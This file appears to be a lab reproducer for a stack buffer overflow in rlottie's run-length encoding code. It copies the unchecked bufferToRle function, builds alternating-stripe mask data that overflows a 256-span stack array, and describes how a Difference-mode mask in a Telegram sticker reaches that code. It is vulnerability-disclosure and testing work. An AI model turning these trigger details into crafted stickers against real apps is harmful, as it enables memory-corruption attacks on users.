/*
 * lab1/repro.cpp
 * Standalone reproducer for the stack buffer overflow in rlottie vrle.cpp.
 *
 * Root cause (vrle.cpp:577-676):
 *   bufferToRle() writes VRle::Span entries into a caller-supplied buffer with
 *   NO output-capacity parameter and NO capacity check.  Both callers
 *   (rleOpGeneric and rleSubstractWithRle) allocate only 256 entries on the
 *   stack yet pass a 1024-byte coverage buffer that can produce up to 512
 *   spans when coverage alternates every pixel.
 *
 * Trigger path from a Telegram sticker (.tgs):
 *   parseMaskProperty  (mode "f" = Difference)
 *   → LOTLayerMaskItem::maskRle  (lottieitem.cpp:390)  rle = rle ^ i.rle()
 *   → VRle::operator^            (vrle.h:154)          opGeneric(Xor)
 *   → rleOpGeneric               (vrle.cpp:613)
 *   → bufferToRle                (vrle.cpp:652)         ← OVERFLOW
 *
 * Compile (no ASan) – shows canary corruption:
 *   g++ -std=c++17 -g -O0 -o repro repro.cpp && ./repro
 *
 * Compile with ASan – deterministic crash:
 *   g++ -std=c++17 -g -O0 -fsanitize=address -o repro_asan repro.cpp && ./repro_asan
 */

#include <algorithm>
#include <array>
#include <cassert>
#include <cstdio>
#include <cstring>
#include <cstdint>
#include <vector>

// ---- types mirrored from rlottie headers -------------------------
using uchar  = unsigned char;
using ushort = unsigned short;

struct Span {
    short  x{0};
    short  y{0};
    ushort len{0};
    uchar  coverage{0};
    // 1 byte implicit padding → sizeof(Span) == 8
};

// ---- helpers from vrle.cpp (verbatim) ----------------------------
static inline uchar divBy255(int x)
{
    return (x + (x >> 8) + 0x80) >> 8;
}

// blit: write a_spans coverage into buffer (max blend)
void blit(const Span *spans, int count, uchar *buffer, int bufferLen, int offsetX)
{
    while (count--) {
        int x = spans->x + offsetX;
        int l = spans->len;
        if (x > bufferLen || l > bufferLen || x + l > bufferLen || x + l < 0) {
            return;
        }
        uchar *ptr = buffer + x;
        while (l--) {
            *ptr = std::max(spans->coverage, *ptr);
            ptr++;
        }
        spans++;
    }
}

// blitXor: XOR-blend b_spans into buffer
void blitXor(const Span *spans, int count, uchar *buffer, int bufferLen, int offsetX)
{
    while (count--) {
        int x = spans->x + offsetX;
        int l = spans->len;
        if (x > bufferLen || l > bufferLen || x + l > bufferLen) {
            return;
        }
        uchar *ptr = buffer + x;
        while (l--) {
            int da = *ptr;
            *ptr = divBy255((255 - spans->coverage) * da +
                            spans->coverage * (255 - da));
            ptr++;
        }
        spans++;
    }
}

/*
 * bufferToRle – verbatim copy from vrle.cpp:577
 * NO output capacity parameter.  This is the vulnerable function.
 */
size_t bufferToRle(uchar *buffer, int bufferLen, int size,
                   int offsetX, int y, Span *out)   // ← no outCapacity
{
    size_t count = 0;
    uchar  value = buffer[0];
    int    curIndex = 0;

    size = offsetX < 0 ? size + offsetX : size;
    if (size > bufferLen) {
        return count;
    }
    for (int i = 0; i < size; i++) {
        uchar curValue = buffer[0];
        if (value != curValue) {
            if (value) {
                out->y        = (short)y;
                out->x        = (short)(offsetX + curIndex);
                out->len      = (ushort)(i - curIndex);
                out->coverage = value;
                out++;           // ← writes past end of caller's 256-element array
                count++;
            }
            curIndex = i;
            value = curValue;
        }
        buffer++;
    }
    if (value) {
        out->y        = (short)y;
        out->x        = (short)(offsetX + curIndex);
        out->len      = (ushort)(size - curIndex);
        out->coverage = value;
        count++;
    }
    return count;
}

// ---- synthesise the crash scenario --------------------------------

/*
 * Construct synthetic RLE data equivalent to what the Lottie render pipeline
 * produces for the two-mask PoC sticker (1024-pixel-wide canvas):
 *
 *   mask_a (mode "a", Add):  solid rectangle x=0..1023 on each row.
 *                             rle_a has ONE span per scanline: {x=0, len=1024}
 *
 *   mask_b (mode "f", Difference/XOR):
 *                             512 alternating 1-px stripes at x=0,2,4,...,1022
 *                             rle_b has 512 spans per scanline.
 *
 * In rleOpGeneric (Operation::Xor), for each scanline y:
 *   blit(a_spans)   → buffer[0..1023] = 255
 *   blitXor(b_spans)→ buffer[0]=0, buffer[2]=0, … (even pixels zeroed)
 *   result buffer:    [0,255,0,255,...] × 512 pixels
 *   bufferToRle emits 512 spans into a 256-span stack array → OVERFLOW.
 */
int main()
{
    constexpr int kCanvasWidth  = 1024;
    constexpr int kScanlines    = 8;      // a few rows is enough to crash
    constexpr int kNumTeeth     = 512;    // alternating 1-px stripes in mask_b

    // ----------------------------------------------------------------
    // Build rle_a: one solid span per scanline [x=0, len=1024, cov=255]
    // ----------------------------------------------------------------
    std::vector<Span> rle_a;
    rle_a.reserve(kScanlines);
    for (int y = 0; y < kScanlines; ++y) {
        Span s;
        s.x        = 0;
        s.y        = (short)y;
        s.len      = (ushort)kCanvasWidth;
        s.coverage = 255;
        rle_a.push_back(s);
    }

    // ----------------------------------------------------------------
    // Build rle_b: 512 alternating 1-px spans per scanline
    //   x=0 len=1, x=2 len=1, x=4 len=1, ..., x=1022 len=1
    // ----------------------------------------------------------------
    std::vector<Span> rle_b;
    rle_b.reserve((size_t)kScanlines * kNumTeeth);
    for (int y = 0; y < kScanlines; ++y) {
        for (int t = 0; t < kNumTeeth; ++t) {
            Span s;
            s.x        = (short)(2 * t);   // even pixel: 0, 2, 4, ...
            s.y        = (short)y;
            s.len      = 1;
            s.coverage = 255;
            rle_b.push_back(s);
        }
    }

    printf("=== rlottie vrle.cpp stack-buffer-overflow reproducer ===\n\n");
    printf("rle_a: %d spans (%d per row)\n", (int)rle_a.size(), 1);
    printf("rle_b: %d spans (%d per row)\n", (int)rle_b.size(), kNumTeeth);
    printf("temp[] capacity:  256 spans (%zu bytes)\n",
           256 * sizeof(Span));
    printf("spans emitted/row (worst case): %d\n", kNumTeeth);
    printf("overflow per row: %d spans = %zu bytes\n\n",
           kNumTeeth - 256, (kNumTeeth - 256) * sizeof(Span));

    // ----------------------------------------------------------------
    // Replicate the exact code path from rleOpGeneric (vrle.cpp:613-676)
    // ----------------------------------------------------------------

    // result->spans in the real code is another 256-span array:
    std::array<Span, 256> result_buf;

    // This is the VULNERABLE temp buffer (256 elements, ~2048 bytes on stack).
    // In rleOpGeneric it sits immediately before saved RBP / return address.
    //
    // Place a canary immediately after it to detect corruption:
    std::array<Span, 256> temp_VULNERABLE;
    volatile uint64_t     canary = 0xDEADBEEFCAFEBABEULL;

    printf("Stack layout (approximate):\n");
    printf("  &temp_VULNERABLE = %p\n", (void*)temp_VULNERABLE.data());
    printf("  &canary          = %p  (offset +%td bytes)\n",
           (void*)&canary,
           (char*)&canary - (char*)temp_VULNERABLE.data());
    printf("  canary before    = 0x%016llx\n\n", (unsigned long long)canary);

    // Process scanlines just like the real rleOpGeneric does:
    size_t a_idx = 0, b_idx = 0;
    int    rows_overflowed = 0;

    while (a_idx < rle_a.size() && b_idx < rle_b.size()) {
        int y = rle_a[a_idx].y;
        assert(rle_b[b_idx].y == y);  // same scanline

        int aLength = rle_a[a_idx].x + rle_a[a_idx].len;   // 1024
        int bLength = rle_b[b_idx + kNumTeeth - 1].x
                    + rle_b[b_idx + kNumTeeth - 1].len;     // 1023

        constexpr auto kBufferSize = 1024;
        std::array<uchar, kBufferSize> array = {{0}};

        // blit solid rect (rle_a row) into coverage buffer
        blit(&rle_a[a_idx], 1, array.data(), kBufferSize, 0);

        // blitXor alternating stripes (rle_b row) into coverage buffer
        blitXor(&rle_b[b_idx], kNumTeeth, array.data(), kBufferSize, 0);

        // *** THE OVERFLOW HAPPENS HERE ***
        // bufferToRle writes up to 512 spans into temp_VULNERABLE (capacity 256)
        Span   *tResult = temp_VULNERABLE.data();
        size_t  size    = bufferToRle(array.data(), kBufferSize,
                                     std::max(aLength, bLength),
                                      0, y, tResult);

        printf("Row y=%-3d: aLength=%-4d bLength=%-4d spans_emitted=%-3zu %s\n",
               y, aLength, bLength, size,
               size > 256 ? "*** OVERFLOW ***" : "ok");

        if (size > 256) ++rows_overflowed;

        a_idx++;
        b_idx += (size_t)kNumTeeth;
    }

    printf("\nRows that overflowed: %d / %d\n", rows_overflowed, kScanlines);
    printf("Canary after:         0x%016llx\n", (unsigned long long)canary);

    if (canary != 0xDEADBEEFCAFEBABEULL) {
        printf("\n[!] CANARY CORRUPTED – stack overflow confirmed.\n");
    } else {
        printf("\n[i] Canary intact (compiler may have reordered stack vars).\n");
        printf("    Run with -fsanitize=address for a deterministic report.\n");
    }

    return 0;
}
